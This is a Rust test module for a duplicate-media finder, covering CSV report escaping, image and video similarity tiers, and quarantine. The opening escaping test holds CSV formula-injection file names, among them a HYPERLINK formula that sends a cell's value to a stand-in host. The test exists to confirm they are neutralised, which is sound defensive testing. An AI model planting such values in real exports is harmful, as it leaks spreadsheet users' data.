        for (value, field) in [
            (
                "=HYPERLINK(\"http://x/?\"&A1).jpg",
                "\"'=HYPERLINK(\"\"http://x/?\"\"&A1).jpg\"",
            ),
            ("+1.jpg", "\"'+1.jpg\""),
            ("-1.jpg", "\"'-1.jpg\""),
            (
                "@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg",
                "\"'@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg\"",
            ),
            ("\tx.jpg", "\"'\tx.jpg\""),
            ("\rx.jpg", "\"'\rx.jpg\""),
            ("a=b.jpg", "a=b.jpg"),
            ("/lib", "/lib"),
        ] {
            assert_eq!(csv_field(value), field, "{:?}", value);
        }
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 0, Some("aaa"));
        fx.add("/lib", "=1+1.jpg", 100, 1, Some("aaa"));
        let mut out = vec![];
        write_csv(&fx.report(), &mut out).unwrap();
        assert!(String::from_utf8(out)
            .unwrap()
            .contains(",/lib,\"'=1+1.jpg\","),);
    }

    #[test]
    fn test_visual_tiers_end_to_end_with_scan() {
        use crate::imagehash::tests::{jpeg, picture, with_exif};
        use image::imageops::{resize, FilterType};
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(lib.join("backup")).unwrap();
        let write = |name: &str, bytes: &[u8]| std::fs::write(lib.join(name), bytes).unwrap();
        let tagged = with_exif(&jpeg(&picture(1, 640, 480), 90));
        write("tagged.jpg", &tagged);
        write("backup/tagged.jpg", &tagged);
        write("stripped.jpg", &jpeg(&picture(1, 640, 480), 90));
        let big = picture(5, 640, 480);
        write("big.jpg", &jpeg(&big, 90));
        write(
            "small.jpg",
            &jpeg(&resize(&big, 320, 240, FilterType::Triangle), 60),
        );
        write("unrelated.jpg", &jpeg(&picture(9, 640, 480), 90));
        // Blank images all have similar hashes; they are left out of similarity matching.
        let blank = |r, g, b| image::RgbImage::from_pixel(640, 480, image::Rgb([r, g, b]));
        write("black.jpg", &jpeg(&blank(0, 0, 0), 90));
        write("white.jpg", &jpeg(&blank(255, 255, 255), 85));
        write("navy.jpg", &jpeg(&blank(20, 20, 90), 80));
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(&lib, &catalog_path, true, &crate::decode::Tools::default())
            .unwrap();

        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        let groups: Vec<(Tier, Vec<&str>)> = report
            .groups
            .iter()
            .map(|g| {
                let mut paths: Vec<&str> = g.files.iter().map(|f| f.path.as_str()).collect();
                paths.sort();
                (g.tier, paths)
            })
            .collect();
        assert_eq!(
            groups,
            vec![
                (
                    Tier::SamePixels,
                    vec!["backup/tagged.jpg", "stripped.jpg", "tagged.jpg"]
                ),
                (Tier::Similar, vec!["big.jpg", "small.jpg"]),
            ]
        );
        assert_eq!(report.summary.unhashed_media, 0);

        // Similar images are only looked for when asked.
        let report = find_dupes(&catalog, &[], Similarity::default()).unwrap();
        assert!(report.groups.iter().all(|g| g.tier != Tier::Similar));
        assert_eq!(report.groups.len(), 1);
    }

    #[test]
    fn test_group_takes_the_weakest_tier_and_keeps_the_largest_similar_image() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 20, Some("aaa"));
        fx.add("/lib", "c.jpg", 50, 5, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, pixels: &str, perceptual: u64, side: u32| {
            let hashes = crate::imagehash::ImageHashes {
                pixels: String::from(pixels),
                perceptual: Some(perceptual),
                fingerprint: Some(vec![100; 16]),
                width: side,
                height: side,
            };
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("a.jpg", "p1", 0, 10);
        set("b.jpg", "p1", 0, 10);
        set("c.jpg", "p2", 0b111, 10);

        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let group = &report.groups[0];
        assert_eq!((group.tier, group.sha256.as_deref()), (Tier::Similar, None));
        // Same pixel count: the larger file wins, then the older one, so not the oldest c.jpg.
        assert_eq!(kept_and_others(group)[0], (true, "a.jpg"));
        let matches: Vec<(&str, Option<Tier>)> = group
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.matches))
            .collect();
        assert_eq!(
            matches,
            [
                ("a.jpg", None),
                ("b.jpg", Some(Tier::Exact)),
                ("c.jpg", Some(Tier::Similar))
            ]
        );
        assert_eq!(group.reclaimable_bytes(), 150);

        // More pixels beat more bytes.
        set("c.jpg", "p2", 0b111, 40);
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        assert_eq!(kept_and_others(&report.groups[0])[0], (true, "c.jpg"));

        // Without the similar link the group is exact, and the oldest copy is kept.
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(2)).unwrap();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier, Tier::Exact);
        assert_eq!(kept_and_others(&report.groups[0])[0], (true, "a.jpg"));
    }

    #[test]
    fn test_similar_group_keeps_the_original_over_a_larger_same_pixel_copy() {
        // A photo manager rewrote the metadata of a copy, which made it larger; a burst shot
        // links them into a similar group. The original is still kept.
        let fx = Fixture::new();
        fx.add("/lib", "original.jpg", 100, 1, None);
        fx.add("/lib", "edited.jpg", 120, 5, None);
        fx.add("/lib", "burst.jpg", 90, 3, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, pixels: &str, perceptual: u64| {
            let hashes = crate::imagehash::ImageHashes {
                pixels: String::from(pixels),
                perceptual: Some(perceptual),
                fingerprint: Some(vec![100; 16]),
                width: 10,
                height: 10,
            };
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("original.jpg", "p1", 0);
        set("edited.jpg", "p1", 0);
        set("burst.jpg", "p2", 1);
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        let matches: Vec<(&str, Option<Tier>)> = report.groups[0]
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.matches))
            .collect();
        assert_eq!(
            matches,
            [
                ("original.jpg", None),
                ("edited.jpg", Some(Tier::SamePixels)),
                ("burst.jpg", Some(Tier::Similar))
            ]
        );
    }

    #[test]
    fn test_audio_without_detail_is_never_similar() {
        let audio = |values: Vec<u32>| HashedAv {
            file: HashedFile::default(),
            duration_ms: 30_000,
            width: 0,
            height: 0,
            frames: None,
            chromaprint: Some(values),
        };
        let tone = || vec![558_758_263; 221];
        let music = || (0..221u32).map(|i| i.wrapping_mul(2_654_435_761)).collect();
        let silent = [(0, audio(tone())), (1, audio(tone()))];
        assert_eq!(similar_av(&silent, DEFAULT_THRESHOLD, true), vec![]);
        let copies = [(0, audio(music())), (1, audio(music()))];
        assert_eq!(similar_av(&copies, DEFAULT_THRESHOLD, true), vec![(0, 1)]);
    }

    #[test]
    fn test_similar_needs_matching_aspect_ratios_and_detail() {
        let fx = Fixture::new();
        fx.add("/lib", "wide.jpg", 100, 1, None);
        fx.add("/lib", "square.jpg", 90, 2, None);
        fx.add("/lib", "wide copy.jpg", 80, 3, None);
        fx.add("/lib", "flat.jpg", 70, 4, None);
        fx.add("/lib", "flat too.jpg", 60, 5, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, perceptual: Option<u64>, width: u32, height: u32| {
            let hashes = crate::imagehash::ImageHashes {
                pixels: String::from(path),
                perceptual,
                fingerprint: perceptual.map(|_| vec![100; 16]),
                width,
                height,
            };
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("wide.jpg", Some(0), 400, 300);
        set("square.jpg", Some(0), 300, 300);
        // Rotated by 90 degrees: the same shape.
        set("wide copy.jpg", Some(1), 225, 301);
        set("flat.jpg", None, 400, 300);
        set("flat too.jpg", None, 400, 300);

        let report =
            find_dupes(&fx.catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let mut paths: Vec<&str> = report.groups[0]
            .files
            .iter()
            .map(|f| f.path.as_str())
            .collect();
        paths.sort();
        assert_eq!(paths, ["wide copy.jpg", "wide.jpg"]);
    }

    #[test]
    fn test_similar_needs_matching_fingerprints() {
        // Two burst shots: the same perceptual hash, but part of the picture changed.
        let fx = Fixture::new();
        fx.add("/lib", "shot 1.jpg", 100, 1, None);
        fx.add("/lib", "shot 2.jpg", 100, 2, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let mut moved = vec![100u8; 1024];
        moved[..40].fill(200);
        for (path, fingerprint) in [("shot 1.jpg", vec![100u8; 1024]), ("shot 2.jpg", moved)] {
            let hashes = crate::imagehash::ImageHashes {
                pixels: String::from(path),
                perceptual: Some(0),
                fingerprint: Some(fingerprint),
                width: 40,
                height: 30,
            };
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        }
        let report =
            find_dupes(&fx.catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups, vec![]);
    }

    #[test]
    fn test_exact_copies_share_a_pixel_hash() {
        // b.jpg is a byte-identical copy of a.jpg that was never decoded; c.jpg has the same
        // pixels as a.jpg. All three have the same pixels.
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 1, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 2, Some("aaa"));
        fx.add("/lib", "c.jpg", 90, 3, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        for path in ["a.jpg", "c.jpg"] {
            let hashes = crate::imagehash::ImageHashes {
                pixels: String::from("p"),
                perceptual: Some(path.len() as u64 * 0xffff),
                fingerprint: Some(vec![100; 16]),
                width: 10,
                height: 10,
            };
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        }
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(0)).unwrap();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier, Tier::SamePixels);
    }

    #[test]
    fn test_short_videos_are_only_compared_with_similar() {
        let video = |duration_ms: i64| HashedAv {
            file: HashedFile::default(),
            duration_ms,
            width: 640,
            height: 360,
            frames: Some((0..9).map(Some).collect()),
            chromaprint: None,
        };
        let short = [(0, video(3000)), (1, video(3000))];
        assert_eq!(similar_av(&short, DEFAULT_THRESHOLD, false), vec![]);
        assert_eq!(similar_av(&short, DEFAULT_THRESHOLD, true), vec![(0, 1)]);
        let long = [(0, video(SHORT_VIDEO_MS)), (1, video(SHORT_VIDEO_MS))];
        assert_eq!(similar_av(&long, DEFAULT_THRESHOLD, false), vec![(0, 1)]);
    }

    #[test]
    fn test_re_encoded_video_is_similar() {
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(&lib).unwrap();
        let Some((a, _, _)) = crate::avhash::tests::videos(&lib) else {
            eprintln!("ffmpeg not available, skipping");
            return;
        };
        let tools = crate::decode::Tools::find();
        if tools.ffprobe.is_none() {
            eprintln!("ffprobe not available, skipping");
            return;
        }
        // A newer exact copy of the original.
        std::fs::create_dir(lib.join("backup")).unwrap();
        let copy = lib.join("backup/a.mp4");
        std::fs::copy(&a, &copy).unwrap();
        let later = std::fs::metadata(&a).unwrap().modified().unwrap()
            + std::time::Duration::from_secs(3600);
        std::fs::File::options()
            .write(true)
            .open(&copy)
            .unwrap()
            .set_modified(later)
            .unwrap();
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(&lib, &catalog_path, true, &tools).unwrap();
        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        // The re-encoded copy matches; the larger original is kept, not the smaller copy; the
        // unrelated video is not in any group.
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier, Tier::Similar);
        let files: Vec<(&str, Option<Tier>)> = report.groups[0]
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.matches))
            .collect();
        assert_eq!(
            files,
            vec![
                ("a.mp4", None),
                ("backup/a.mp4", Some(Tier::Exact)),
                ("b.mp4", Some(Tier::Similar)),
            ]
        );
        // Similar video is found without asking for similar images.
        assert_eq!(
            find_dupes(&catalog, &[], Similarity::default())
                .unwrap()
                .groups
                .len(),
            1
        );
        // The exact copy is quarantined even though the group is similar; the re-encode is not.
        let quarantine = dir.path().join("quarantine");
        let (plan, _) = crate::plan::plan_quarantine(
            &catalog,
            &catalog_path,
            &report,
            &[],
            &quarantine,
            OffsetDateTime::now_utc(),
        )
        .unwrap();
        let moved: Vec<&str> = plan.moves.iter().map(|m| m.from.as_str()).collect();
        let copy = crate::scan::resolve(&copy).unwrap();
        assert_eq!(moved, vec![copy.to_str().unwrap()]);
    }

    #[test]
    fn test_end_to_end_with_scan() {
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(lib.join("backup")).unwrap();
        std::fs::write(lib.join("a.jpg"), b"same").unwrap();
        std::fs::write(lib.join("backup/a.jpg"), b"same").unwrap();
        std::fs::write(lib.join("other.jpg"), b"diff").unwrap();
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(&lib, &catalog_path, true, &crate::decode::Tools::default())
            .unwrap();

        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let mut paths: Vec<&str> = report.groups[0]
            .files
            .iter()
            .map(|f| f.path.as_str())
            .collect();
        paths.sort();
        assert_eq!(paths, vec!["a.jpg", "backup/a.jpg"]);
    }
}
